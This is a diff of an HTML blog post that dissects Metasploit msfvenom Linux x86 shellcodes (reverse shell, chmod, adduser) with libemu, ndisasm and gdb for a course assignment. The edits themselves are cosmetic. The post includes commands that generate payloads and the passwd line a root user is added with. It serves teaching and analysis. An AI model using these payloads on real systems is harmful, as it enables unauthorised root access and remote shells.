@@ -10,8 +10,7 @@
 </title>
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <link rel="stylesheet" href="http://www.wryway.com/theme/css/cid.css">
-        <link href="http://www.wryway.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Oleg's Web Log Atom Feed" />
+        <link rel="stylesheet" href="/theme/css/cid.css">
         
  
         <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-touch-icon-57x57.png">
@@ -43,12 +42,12 @@
             <div class="container">
 
 <header class="blog-header">
-    <h1><a href="http://www.wryway.com/blog/">Oleg's Web Log</a></h1>
+    <h1><a href="/blog/">Oleg's Web Log</a></h1>
     <p> Stochastic records on Information Security </p>
     <nav>
-        <a href="http://www.wryway.com/blog/categories/">CATEGORIES</a>
-        <a href="http://www.wryway.com/blog/tags/">TAGS</a>
-        <a href="http://www.wryway.com/blog/archives/">ARCHIVES</a>
+        <a href="/blog/categories/">CATEGORIES</a>
+        <a href="/blog/tags/">TAGS</a>
+        <a href="/blog/archives/">ARCHIVES</a>
     </nav>
 </header>
 
@@ -57,7 +56,7 @@
         <header>
             <h1>Dissecting msfvenom shellcodes (SLAE, Assignment #5)</h1>
             <p class="category">
-                Category: <a class="category" href="http://www.wryway.com/blog/category/exploit-development/"><b>Exploit development</b></a>
+                Category: <a class="category" href="/blog/category/exploit-development/"><b>Exploit development</b></a>
             </p>
             <p class="date">
                 Written on <time datetime="2015-10-07T20:00:00-04:00">Oct 07, 2015</time>
@@ -66,9 +65,9 @@
 
         <article>
             <p>In this post I will discuss how a shellcode logic and architecture can be understood. For that I will use <code>libemu</code>, <code>ndisasm</code>, and <code>gdb</code>. <code>libemu</code> is an x86 shellcode emulation framework that allows one to faster understand the shellcode logic. <code>ndisasm</code> is a disassembler that comes as a part of <code>nasm</code> package on Kali. And <code>gdb</code> is the venerable GNU Debugger, arguably the best debugger for Linux if you are into CLI.</p>
-<p>To generate payloads I will use Metasploit Framework (MSF). And instead of used in the past and recently phased out <code>msfpayload</code> tool I will use its better replacement - <code>msfvenom</code>.</p>
+<p>To generate payloads I will use Metasploit Framework (MSF). And, instead of the used in the past and recently phased out <code>msfpayload</code> tool, I will use its better replacement - <code>msfvenom</code>.</p>
 <h1>Installation of libemu</h1>
-<p>When I was installing <code>libemu</code> I expected to find it in Kali repositories, but alas it wasn't there. After googling a bit I found that most of the links led to <a href="http://libemu.carnivore.it">libemu.carnivore.it</a> page that was down at the time of this writing. So I had to find and fork its source code elsewhere on the GitHub. After getting my hands on its source code I followed this <a href="http://blog.xanda.org/2012/05/16/installation-of-libemu-and-pylibemu-on-ubuntu/">guide on libemu installation</a> successfully installed it on my system:</p>
+<p>When I was installing <code>libemu</code>, I expected to find it in Kali repositories, but alas it wasn't there. After googling a bit, I found that most of the links led to <a href="http://libemu.carnivore.it">libemu.carnivore.it</a> page, which was down at the time of this writing. So I had to find and fork its source code elsewhere on the GitHub. After getting my hands on its source code I followed this <a href="http://blog.xanda.org/2012/05/16/installation-of-libemu-and-pylibemu-on-ubuntu/">guide on libemu installation</a> and successfully installed it on my system:</p>
 <div class="highlight"><pre><span class="c"># The only dependency I had to satisfy on my Kali machine</span>
 apt-get install libtool
 <span class="nb">cd</span> ~/Downloads
@@ -106,7 +105,7 @@ Inject the meterpreter server payload (staged). Listen for a connection (Linux x
 </pre></div>
 
 
-<p>As you can see, most of the available payloads are for spawning either reverse or bind shells. By the way this is the reason the shellcode is called so: shellcode is a sequence of assembly instructions that is most often used in exploits to spawn an (administrative) shell.</p>
+<p>As you can see, most of the available payloads are for spawning either reverse or bind shells. By the way, here is the reason the shellcode is called so: shellcode is a sequence of assembly instructions that is most often used in exploits to spawn an (administrative) shell.</p>
 <p>For the first example I will take and dissect the reverse shell payload. Let's first see if there are mandatory options for this payload (output is truncated for brevity):</p>
 <div class="highlight"><pre>msfvenom -p linux/x86/shell_reverse_tcp --payload-options
 </pre></div>
@@ -130,8 +129,8 @@ LPORT  4444             yes       The listen port
 </pre></div>
 
 
-<p>The <code>-vvv</code> option to <code>sctest</code> increases verbosity. The <code>-S</code> is for reading input from stdin. The <code>-s</code> option controls the maximum number of instructions to execute and defaults to 1, which means <code>sctest</code> will emulate execution of only the first instruction of the supplied shellcode. To be on the safe side and make sure that every shellcode instruction is executed it is usually set to some big number, like 100000.</p>
-<p><img alt="Top of the sctest output" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/sctest-top-output.png" title="Top of the sctest output" />
+<p>The <code>-vvv</code> option to <code>sctest</code> increases verbosity. The <code>-S</code> is for reading input from stdin. The <code>-s</code> option controls the maximum number of instructions to execute and defaults to 1, which means <code>sctest</code> will emulate execution of only the first instruction of the supplied shellcode. To be on the safe side and make sure that every shellcode instruction is executed, it is usually set to some big number, like 100000.</p>
+<p><img alt="Top of the sctest output" src="/blog/dissecting-msfvenom-shellcodes/sctest-top-output.png" title="Top of the sctest output" />
 <div class="img-caption">Top of the sctest output</div></p>
 <p>At the top of the output you can see how <code>sctest</code> tears down the shellcode instruction by instruction and shows you the state of registers after execution of each instruction. At the bottom of the output you will find the reconstructed high level view of what's going on:</p>
 <div class="highlight"><pre><span class="kt">int</span> <span class="n">socket</span> <span class="p">(</span>
@@ -181,10 +180,10 @@ LPORT  4444             yes       The listen port
 
 
 <p>At first glance I thought that <code>sctest</code> reconstructed the whole program in C, but then quickly realized that it is just a C-like syntax. Nevertheless the job <code>sctest</code> did in this department is amazing.</p>
-<p>From the output above you can tell that at first the shellcode creates a socket with the <code>socket()</code> function. Then it forwards process's standard input, output and error to that socket with several calls to <code>dup2()</code> function. After that it initiates a connection to 127.1.1.1 address on port 4444 using <code>connect()</code> function, just as we wanted it to. And finally it spawns the <code>/bin/sh</code> shell using <code>execve()</code>.</p>
+<p>From the output above you can tell that at first the shellcode creates a socket with the <code>socket()</code> function. Then it forwards the process standard input, output and error to that socket with several calls to <code>dup2()</code> function. After that, it initiates a connection to 127.1.1.1 address on port 4444 using <code>connect()</code> function, just as we wanted it to. And finally it spawns the <code>/bin/sh</code> shell using <code>execve()</code>.</p>
 <p>As you can see using <code>sctest</code> we were able to understand what the shellcode does without even disassembling it. But this is not always the case. Let's take a look at the next example.</p>
 <h1>Example #2: Chmod</h1>
-<p>As in the previous example I will pipe the generated shellcode into <code>sctest</code>. This time it will be the chmod payload. All it does is modify Unix permissions on a file to, by default, 0666.</p>
+<p>As in the previous example, I will pipe the generated shellcode into <code>sctest</code>. This time it will be the chmod payload. All it does is modify Unix permissions on a file to, by default, 0666.</p>
 <div class="highlight"><pre>msfvenom -p linux/x86/chmod <span class="nv">FILE</span><span class="o">=</span>tmp.bin -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
 </pre></div>
 
@@ -199,12 +198,12 @@ LPORT  4444             yes       The listen port
 </pre></div>
 
 
-<p>Looking at it I could tell that the shellcode probably calls the <code>chmod()</code> and <code>exit()</code> functions, but what parameters were passed to <code>chmod()</code> is not clear. Let's take a look at the graph converted from dot to png file format:</p>
+<p>Looking at it I could tell that the shellcode probably called the <code>chmod()</code> and <code>exit()</code> functions, but what parameters were passed to <code>chmod()</code> was not clear. Let's take a look at the graph converted from dot to png file format:</p>
 <div class="highlight"><pre>dot -Tpng -o tmp.png tmp.dot <span class="o">&amp;&amp;</span> eog tmp.png
 </pre></div>
 
 
-<p><img alt="Chmod shellcode call graph" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/chmod-shellcode-call-graph.png" title="Chmod shellcode call graph" />
+<p><img alt="Chmod shellcode call graph" src="/blog/dissecting-msfvenom-shellcodes/chmod-shellcode-call-graph.png" title="Chmod shellcode call graph" />
 <div class="img-caption">Chmod shellcode call graph</div></p>
 <p>On the call graph we can again see that <code>sctest</code> definitely caught calls to the <code>chmod()</code> and <code>exit()</code> functions. We can also see that the second argument (ECX register) to the <code>chmod</code> system call is set to <em>0x1b6</em>, which, as we can confirm on Linux command line with </p>
 <div class="highlight"><pre><span class="nb">printf</span> <span class="s2">&quot;%o\n&quot;</span> 0x1b6 
@@ -212,16 +211,15 @@ LPORT  4444             yes       The listen port
 
 
 <p>command translates into <em>666</em> in the octal numeral system, which is the default permissions used by the shellcode. </p>
-<p>Next, because of the call-pop instruction sequence we may suppose that the first argument to the <code>chmod()</code> is probably set using the call-pop technique which is a modification of the venerable jmp-call-pop technique with data coming before the destination of call jump. The fact that the graph shows relative address of 0x1 as a call destination is odd and we'll have to use <code>ndisasm</code> and <code>gdb</code> to understand why it is so. But I reserved this activity to a similar problem in the last example that follows.</p>
+<p>Next, because of the call-pop instruction sequence, we may suppose that the first argument to the <code>chmod()</code> is probably set using the call-pop technique which is a modification of the venerable jmp-call-pop technique with data coming before the destination of call jump. The fact that the graph shows relative address of 0x1 as a call destination is odd and we'll have to use <code>ndisasm</code> and <code>gdb</code> to understand why it is so. But I reserved this activity to a similar problem in the last example that follows.</p>
 <p>Also note that the above shellcode contains null bytes. That is because <code>msfvenom</code> does not care about bad characters if you don't tell it to. And although I do not encrypt payloads in my examples here, note that <code>sctest</code> can equally work its way through encrypted shellcodes.</p>
 <h1>Example #3: Adduser</h1>
 <p>In this example I want to zero in on the case where the <code>sctest</code> is mostly useless and some interaction with <code>gdb</code> is needed to fully see the shellcode through.</p>
-<p>After running the following command,</p>
+<p>After running the following command, you will see that <code>sctest</code> was not able to generate a high view of the shellcode logic and even the tmp.dot call graph is empty:</p>
 <div class="highlight"><pre>msfvenom -p linux/x86/adduser -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
 </pre></div>
 
 
-<p>you will see that <code>sctest</code> was not able to generate a high view of the shellcode logic and even the tmp.dot call graph is empty.</p>
 <p>Let's try a different approach and disassemble the shellcode with <code>ndisasm</code>:</p>
 <div class="highlight"><pre>msfvenom -p linux/x86/adduser -f raw &gt; tmp.bin <span class="o">&amp;&amp;</span> ndisasm -b32 tmp.bin
 </pre></div>
@@ -261,18 +259,18 @@ LPORT  4444             yes       The listen port
 </pre></div>
 
 
-<p>Looking at the above disassembly and my comments you can tell that the shellcode:</p>
+<p>Looking at the above disassembly and my comments, you can tell that the shellcode:</p>
 <ol>
 <li>Sets real and effective UID to 0 (gets root privileges)</li>
 <li>Opens <code>/etc/passwd</code> file</li>
 <li>Writes something into it, and</li>
 <li>Exits</li>
 </ol>
-<p>Knowing that the shellcode adds a user named <em>metasploit</em> with the same password it is not difficult to guess what exactly is written to the <code>/etc/passwd</code>. Knowing what exactly the shellcode does I actually ran it and sure enough found <em>metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh</em> string inserted as a last thing in the file.</p>
+<p>Knowing that the shellcode adds a user named <em>metasploit</em> with the same password, it is not difficult to guess what exactly is written to the <code>/etc/passwd</code>. Knowing what exactly the shellcode does, I actually ran it and, sure enough, found <em>metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh</em> string inserted as the last thing in the file.</p>
 <p>To decipher the syscall codes I used the <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code> file where Linux x86 system calls are defined.</p>
-<p>The 2001 octal number pushed to ECX represents file access mode flags. To understand what it means I looked into the <code>/usr/include/asm-generic/fcntl.h</code> file, where <code>open()</code> function flags are defined. 2001 represented a combination of <code>O_WRONLY</code> (01) and <code>O_APPEND</code> (02000) flags, which makes a perfect sense for the action the shellcode takes.</p>
-<p>Now the interesting part. Note that the call instruction jumps to the 0x53 address. But then there is no separate instructions at that address. There is an instruction at the address 0x52 and then at 0x55. This fact indicates that in the "gibberish" part of the code some incorrect sequence of bytes confused the disassembler and the bytes-to-opcodes translation went off. </p>
-<p>Note the sequence of bytes at the 0x52 address - 0A598B. The 53rd byte, where the <code>call</code> instruction jumps is 59. I will regenerate payload in the C format, take the part starting from 53rd byte and disassemble it to get the correct bytes-to-opcodes translation. For that I will use the <a href="https://github.com/reider-roque/reed/tree/master/tools">scdisas</a> script that I created while going through the SLAE course materials.</p>
+<p>The 2001 octal number pushed to ECX represents file access mode flags. To understand what it means I looked into the <code>/usr/include/asm-generic/fcntl.h</code> file, where <code>open()</code> function flags are defined. 2001 represented a combination of <code>O_WRONLY</code> (01) and <code>O_APPEND</code> (02000) flags, which makes perfect sense for the action the shellcode takes.</p>
+<p>Now, the interesting part. Note that the call instruction jumps to the 0x53 address. But then there are no separate instructions at that address. There is an instruction at the address 0x52 and then at 0x55. This fact indicates that in the "gibberish" part of the code some incorrect sequence of bytes confused the disassembler and the bytes-to-opcodes translation went off. </p>
+<p>Note the sequence of bytes at the 0x52 address - 0A598B. The 53rd byte, where the <code>call</code> instruction jumps is 59. I will regenerate payload in the C format, take the part starting from 53rd byte, and disassemble it to get the correct bytes-to-opcodes translation. For that I will use the <a href="https://github.com/reider-roque/reed/tree/master/tools">scdisas</a> script, which I created while going through the SLAE course materials.</p>
 <p>Producing shellcode in the format ready to be pasted into a C program:</p>
 <div class="highlight"><pre>msfvenom -p linux/x86/adduser -f c
 </pre></div>
@@ -307,7 +305,7 @@ LPORT  4444             yes       The listen port
 </pre></div>
 
 
-<p>In the above output you can see that the instruction where call passes execution flow is pop instruction. And that means that the shellcode employed the variation of jmp-call-pop technique, as encountered in the previous example. So what I called "gibberish" is actually some kind of data, most likely a string, address to which gets loaded into ECX register. By now we already know what string it is, but just to make sure let's take a look at it in <code>gdb</code>.</p>
+<p>In the above output you can see that the instruction where call passes execution flow is a pop instruction. That means that the shellcode employed the variation of jmp-call-pop technique, as encountered in the previous example. So, what I called "gibberish" is actually some kind of data, most likely a string, address to which gets loaded into ECX register. By now we already know what string it is, but just to make sure, let's take a look at it in <code>gdb</code>.</p>
 <p>To run the shellcode in <code>gdb</code> I'll save it in the ELF format. The ELF format that <code>msfvenom</code> outputs runs without any problems, but the binary is stripped of all symbols, which means that we won't be able to set a breakpoint on the <em>_start</em> or <em>main</em> labels. To find the entry point we can use the <code>readelf</code> utility. One of the lines from its output will point us to the address in question:</p>
 <div class="highlight"><pre>msfvenom -p linux/x86/adduser -f elf &gt; tmp.elf
 chmod +x tmp.elf
@@ -330,15 +328,15 @@ readelf --headers tmp.elf
 </pre></div>
 
 
-<p><img alt="Disassembly view in gdb" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/disassembly-view-in-gdb.png" title="Disassembly view in gdb" />
+<p><img alt="Disassembly view in gdb" src="/blog/dissecting-msfvenom-shellcodes/disassembly-view-in-gdb.png" title="Disassembly view in gdb" />
 <div class="img-caption">Disassembly view in gdb</div></p>
-<p>On the above picture you can see that the data starts at the address following the <code>call</code> instruction which is 0x0804807f. And running either of the following two commands we can be certain that the 40 bytes of the data represent the string that as we saw earlier written to the <code>/etc/passwd</code> file:</p>
+<p>On the above picture you can see that the data starts at the address following the <code>call</code> instruction which is 0x0804807f. And running either of the following two commands, we can be certain that the 40 bytes of the data represent the string that as we saw earlier written to the <code>/etc/passwd</code> file:</p>
 <div class="highlight"><pre><span class="o">(</span>gdb<span class="o">)</span> x/40cb 0x0804807f
 <span class="o">(</span>gdb<span class="o">)</span> x/s 0x0804807f
 </pre></div>
 
 
-<p><img alt="Checking string data in gdb" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/checking-string-data-in-gdb.png" title="Checking string data in gdb" />
+<p><img alt="Checking string data in gdb" src="/blog/dissecting-msfvenom-shellcodes/checking-string-data-in-gdb.png" title="Checking string data in gdb" />
 <div class="img-caption">Checking string data in gdb</div></p>
 <div class="divider"></div>
 
@@ -363,19 +361,6 @@ This blog post was created to fulfill the requirements of the <a href="http://se
             </p>
         </footer>
 
-<div class="comments">
-    <div id="disqus_thread"></div>
-    <script type="text/javascript">
-        var disqus_shortname = 'wryway';
-        (function() {
-            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-        })();
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</div>
 
     </div>
 
@@ -395,16 +380,10 @@ This blog post was created to fulfill the requirements of the <a href="http://se
     </ul>
 
     <p class="disclaimer">
-    Oleg Mitrofanov &copy; 2015.
+    Oleg Mitrofanov &copy; 2015-2016.
     Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/hdra/Pelican-Cid">Cid</a> theme.
     </p>
 </footer>
             </div>
-<script>
-    var _gaq=[['_setAccount','UA-68669065-1'],['_trackPageview']];
-    (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
-    g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
-    s.parentNode.insertBefore(g,s)}(document,'script'));
-</script>
     </body>
 </html>
